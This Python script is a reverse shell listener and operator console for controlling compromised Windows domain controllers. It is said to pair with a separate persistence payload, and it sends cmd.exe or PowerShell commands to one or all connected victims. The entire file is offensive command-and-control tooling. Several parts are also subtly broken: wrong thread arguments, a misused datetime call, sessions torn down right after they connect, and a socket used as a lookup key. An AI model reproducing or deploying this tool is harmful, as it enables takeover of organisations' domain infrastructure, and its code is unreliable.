#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Domain Controller Reverse Shell Client / Listener
Pairs with: DC_Payload.py (Target Persistence Agent)

FEATURES:
 1. Listens for incoming TCP connections from the DC payload
 2. Supports multiple concurrent sessions
 3. Interactive command interface
 4. Supports cmd.exe and PowerShell output
 5. Session tracking with unique IDs
 6. Auto-reconnect detection for persistence

"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional

# ============================================================================
# CONFIGURATION
# ============================================================================

# Default Listener Settings
DEFAULT_HOST = "0.0.0.0"  # Listen on all interfaces
DEFAULT_PORT = 4444       # Default port (can be overridden)
MAX_BUFFER_SIZE = 4096     # Socket buffer size (bytes)
MAX_CONCURRENT_SESSIONS = 10

# Output Display Settings
PROMPT_PREFIX = "[{session_id}] >"
ERROR_PREFIX = "   [!] "
SUCCESS_PREFIX = "   [+] "

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class Session:
    """Track active connections for session management."""
    socket: socket
    addr: tuple
    session_id: str
    created: datetime.datetime
    command_mode: str = "cmd"  # cmd or powershell
    
    def get_prompt(self):
        return PROMPT_PREFIX.format(session_id=self.session_id)
    
    def get_info(self):
        return f"{self.session_id}: {self.addr[0]}:{self.addr[1]} | Mode: {self.command_mode}"

# ============================================================================
# SOCKET HANDLER (Multi-Threaded)
# ============================================================================

class SocketManager:
    """
    Manages the TCP listener and handles incoming connections.
    Runs in a separate thread for non-blocking operation.
    """
    
    def __init__(self, host: str, port: int, default_mode: str = "cmd"):
        self.host = host
        self.port = port
        self.default_mode = default_mode
        self.socket: Optional[socket.socket] = None
        self.sessions: Dict[str, Session] = {}
        self.running = False
        self.lock = threading.Lock()  # Thread safety for session dict
        
    def start(self):
        """Initialize and start the listener."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        
        self.socket.settimeout(1.0)  # Non-blocking for main loop
        
        print("=" * 40)
        print("DC REVERSE SHELL CLIENT / LISTENER")
        print("=" * 40)
        print(f"[+] Listening on: {self.host}:{self.port}")
        print(f"[+] Mode: {self.default_mode}")
        print(f"[+] Max Concurrent Sessions: {MAX_CONCURRENT_SESSIONS}")
        print(f"[+] Press Ctrl+C to stop listener")
        print("=" * 40)
        
        self.running = True
        print(f"[+] Waiting for connection...")
        
        while self.running:
            try:
                client_sock, addr = self.socket.accept()
                self.handle_connection(client_sock, addr)
            except socket.timeout:
                continue
            except Exception as e:
                print(f"[!] Error accepting connection: {e}")
                time.sleep(1)
                continue
        
        if self.socket:
            self.socket.close()
            print("[*] Listener closed cleanly.")
    
    def handle_connection(self, client_sock: socket.socket, addr: tuple):
        """
        Process a single incoming connection in a dedicated thread.
        Each session gets a unique ID and command mode detection.
        """
        with self.lock:
            session_id = self._generate_session_id(addr)
            session_mode = self._detect_mode(client_sock)
            
            # Auto-detect mode from user prompt or default
            if session_mode is None:
                session_mode = self.default_mode
                session_id = f"SID_{int(time.time() * 1000)}"
                print(f"[+] New Session: {session_id} | Mode: {session_mode}")
        
        # Create session object
        session = Session(
            socket=client_sock,
            addr=addr,
            session_id=session_id,
            created=datetime.datetime.now(),
            command_mode=session_mode
        )
        
        # Add to session dict
        with self.lock:
            self.sessions[session_id] = session
        
        # Start background thread for this session
        session_thread = threading.Thread(
            target=SessionThread,
            args=(client_sock, addr, session_id, session_mode)
        )
        session_thread.daemon = True
        session_thread.start()
        
        print(f"[+] Connected: {addr[0]}:{addr[1]} | Mode: {session_mode}")
        print(f"[*] Session ID: {session_id}")
        print(f"    [Thread started for interactive shell]")
        
        # Keep this thread alive (optional for monitoring)
        time.sleep(1)
        
        with self.lock:
            if self.sessions.get(session_id):
                self.sessions[session_id].socket.close()
                del self.sessions[session_id]
        
        print(f"[!] Session {session_id} closed")

    def _generate_session_id(self, addr: tuple) -> str:
        """Generate unique session ID from IP/Port."""
        ip, port = addr
        # Clean IP for display
        clean_ip = ip.replace('.', '_').replace(':', '_').replace('-', '_')
        return f"DC-{clean_ip[:10]}-{port}"

    def _detect_mode(self, client_sock: socket.socket) -> Optional[str]:
        """
        Attempt to detect mode from connection metadata.
        Returns: 'cmd', 'powershell', or None (use default)
        """
        try:
            # Receive first command to detect shell
            msg = client_sock.recv(MAX_BUFFER_SIZE)
            if msg:
                text = msg.decode('utf-8', errors='ignore').strip()
                # Look for PowerShell indicators
                if 'powershell' in text.lower() or 'PS C:\\' in text:
                    return "powershell"
                elif 'C:\\>' in text or 'C:\\Users\\' in text:
                    return "cmd"
                # If first command doesn't help, return default
                return self.default_mode
        except:
            pass
        return None

# ============================================================================
# SESSION THREAD (Per-Connection Handler)
# ============================================================================

class SessionThread:
    """
    Handles a single active session.
    Pipes input/output in real-time until disconnected.
    """
    
    def __init__(self, sock: socket.socket, addr: tuple, session_id: str, mode: str):
        self.sock = sock
        self.addr = addr
        self.session_id = session_id
        self.mode = mode
        self.running = True
        
        # Set up threading for stdout/err reading
        self.stdout_thread = threading.Thread(target=self._read_output, args=(sock))
        self.stdout_thread.daemon = True
        self.stdout_thread.start()
        
        print(f"    [Output thread started for {session_id}]")

    def _read_output(self, sock: socket.socket):
        """
        Continuously read stdout/stderr from the connected DC.
        Prints in real-time as it arrives.
        """
        while self.running:
            try:
                data = sock.recv(MAX_BUFFER_SIZE)
                if not data:
                    # Connection closed
                    print(f"    [DC closed connection: {self.session_id}]")
                    break
                
                # Decode and print with buffering
                text = data.decode('utf-8', errors='ignore')
                print(text.strip(), end='')  # No newline for streaming
            except Exception as e:
                if "Connection reset" in str(e):
                    print(f"    [!] Connection reset: {self.session_id}")
                    break
                else:
                    print(f"    [!] Read error: {e}")
                    break

    def read_prompt(self) -> Optional[str]:
        """
        Wait for and return a complete prompt from the DC.
        Used to know when a command completes.
        """
        try:
            # Small buffer for prompt detection
            msg = self.sock.recv(512)
            if msg:
                return msg.decode('utf-8', errors='ignore').strip()
            return None
        except:
            return None

# ============================================================================
# INTERACTIVE CLIENT INTERFACE
# ============================================================================

class InteractiveShell:
    """
    Main interactive interface that receives commands from user.
    Forwards them to connected sessions.
    """
    
    def __init__(self, socket_manager: SocketManager):
        self.manager = socket_manager
        self.running = True
        
    def run(self):
        """Main loop for receiving user commands."""
        print("\n" + "=" * 50)
        print("INTERACTIVE SHELL - Type commands to send to DC")
        print("Type 'help' for available commands")
        print("Type 'quit' or 'exit' to close")
        print("=" * 50 + "\n")
        
        while self.running:
            try:
                # Get user input
                cmd = input(PROMPT_PREFIX.replace("{session_id}", "[*]"))
                self.process_command(cmd)
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Graceful shutdown initiated...")
                self.running = False
    
    def process_command(self, cmd: str):
        """
        Parse and route user command to all or specific sessions.
        """
        cmd = cmd.strip()
        if not cmd:
            return
        
        # Command routing
        parts = cmd.lower().split(maxsplit=1)
        command = parts[0] if parts else ""
        args = parts[1] if len(parts) > 1 else ""
        
        if self._handle_help(command, args):
            return
        
        if self._handle_session_management(command, args):
            return
        
        if self._handle_broadcast(command, args):
            return
        
        # Default: Send to first available session
        print(f"[*] Sending to first session: {args if args else '<no args>'}")
        self._send_to_session(command, args)

    def _handle_help(self, cmd: str, args: str) -> bool:
        """Handle help commands."""
        help_commands = {
            'help': ['Available commands: help, sessions, broadcast, clear, quit, exit'],
            'clear': ['Clears terminal buffer'],
            'sessions': ['List all active sessions'],
            'broadcast': ['Send command to ALL connected sessions'],
            'quit': ['Close this session'],
            'exit': ['Close this session']
        }
        
        if cmd in help_commands:
            print(f"   [Help] {help_commands[cmd]}")
            if cmd in ['sessions', 'broadcast']:
                self._handle_session_management(cmd, args)
            return True
        return False

    def _handle_session_management(self, cmd: str, args: str) -> bool:
        """Handle session-specific commands."""
        sessions = list(self.manager.sessions.keys())
        
        if cmd == 'sessions':
            if sessions:
                print("\n   [Active Sessions]")
                for sid in sessions:
                    sess = self.manager.sessions[sid]
                    print(f"     - {sid} | Mode: {sess.command_mode} | Created: {sess.created}")
                print()
                return True
        
        if cmd in ['quit', 'exit']:
            print(f"[*] Closing session: {cmd}")
            # Find the session to close
            for sid, sess in self.manager.sessions.items():
                if sess.command_mode == cmd:
                    # Or match by ID if user specifies
                    if args:
                        if sid == args:
                            sess.socket.close()
                            print(f"    [!] Closed: {sid}")
                            return True
            return True
        
        return False

    def _handle_broadcast(self, cmd: str, args: str) -> bool:
        """Handle broadcast commands."""
        print(f"[*] Broadcasting '{args}' to ALL sessions...")
        if sessions := list(self.manager.sessions.values()):
            for sess in sessions:
                self._send_to_session(cmd, args, sess.socket)
            return True
        return False

    def _send_to_session(self, cmd: str, args: str, sock: socket.socket = None):
        """
        Send command to target session.
        If sock provided, use specific session.
        """
        if sock:
            session_id = sock
            session_sock = self.manager.sessions[session_id].socket
        else:
            session_sock = sock
        
        if session_sock:
            try:
                # Format: COMMAND with quotes
                full_cmd = f"powershell -c \"{cmd}\"" if self.manager.default_mode == 'powershell' else f"cmd.exe /c \"{cmd}\""
                session_sock.send(f"{full_cmd}\n".encode('utf-8'))
                time.sleep(0.1)
            except Exception as e:
                print(f"    [Error sending: {e}]")
        
        print(f"[*] Command sent: {cmd}")
        
        if self.manager.default_mode == 'cmd':
            # Show prompt
            time.sleep(0.2)
            try:
                prompt = self.manager.sessions.get('SID_FIRST', Session(
                    socket=sock, addr=('127.0.0.1', 0), 
                    session_id='SID_FIRST', created=datetime.now()
                )).read_prompt()
                if prompt and prompt:
                    print(f"\n   [Prompt] {prompt}")
            except:
                pass

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def get_client_path():
    """Get the absolute path of this script for logging."""
    return os.path.abspath(sys.argv[0])

def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="DC Reverse Shell Client / Listener")
    parser.add_argument('--host', type=str, default=DEFAULT_HOST, help='Listener IP (Default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listener port (Default: 4444)')
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Default shell mode')
    parser.add_argument('--install', action='store_true', help='Install Windows Task (Optional)')
    
    args = parser.parse_args()
    
    # Setup script path
    script_path = get_client_path()
    
    # Create socket manager
    socket_manager = SocketManager(
        host=args.host,
        port=args.port,
        default_mode=args.mode
    )
    
    # Start listener in background thread
    listener_thread = threading.Thread(target=socket_manager.start)
    listener_thread.daemon = True
    listener_thread.start()
    
    print(f"\n[+] Client running from: {script_path}")
    print(f"[*] Background listener started on port {args.port}")
    
    # Interactive shell
    interactive = InteractiveShell(socket_manager)
    interactive.run()
    
    print("[*] Client terminated.")

if __name__ == "__main__":
    main()
